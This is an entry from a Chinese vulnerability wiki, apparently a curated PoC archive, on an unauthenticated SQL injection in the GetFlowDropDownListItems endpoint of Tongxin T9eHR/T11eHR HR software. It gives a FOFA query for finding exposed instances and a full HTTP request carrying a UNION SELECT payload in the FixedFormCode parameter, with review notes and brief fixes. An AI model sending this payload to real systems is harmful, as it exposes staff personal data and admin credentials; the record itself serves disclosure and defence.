---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "同鑫T9eHR/T11eHR GetFlowDropDownListItems FixedFormCode SQL注入"
product: "同鑫T9eHR/T11eHR"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "两个产品线但无build；SQL Server两列UNION"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%90%8C%E9%91%AB/%E5%90%8C%E9%91%ABeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20GetFlowDropDownListItems%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/TX.CDN\""
fofa_unverified: "body="
id: "vw-c9d6d89e9346da08a0bfa3c8"
entity_id: "ve-c9d6d89e9346da08a0bfa3c8"
schema_version: "1"
---

# 同鑫T9eHR/T11eHR GetFlowDropDownListItems FixedFormCode SQL注入

## 条目说明

- 对象与具体问题：同鑫T9eHR/T11eHR；GetFlowDropDownListItems FixedFormCode SQL注入
- 版本、配置及部署条件：两个产品线但无build；SQL Server两列UNION
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 有明确参数/UNION载荷，无@@VERSION响应或源码，需分别证明T9/T11受影响
- 在野已知无来源，写木马是条件性扩展并未示范
- 官方安全版本和补丁链接缺失；规范HTTP围栏和HR业务分类

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

同鑫eHR人力资源管理系统 GetFlowDropDownListItems 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响范围

同鑫T9eHR、同鑫T11eHR

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/TX.CDN"

POC/EXP：

```http
POST /Common/GetFlowDropDownListItems HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=utf-8

FixedFormCode=1%27%20UNION%20ALL%20SELECT%20NULL%2C@@VERSION--
```


## 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
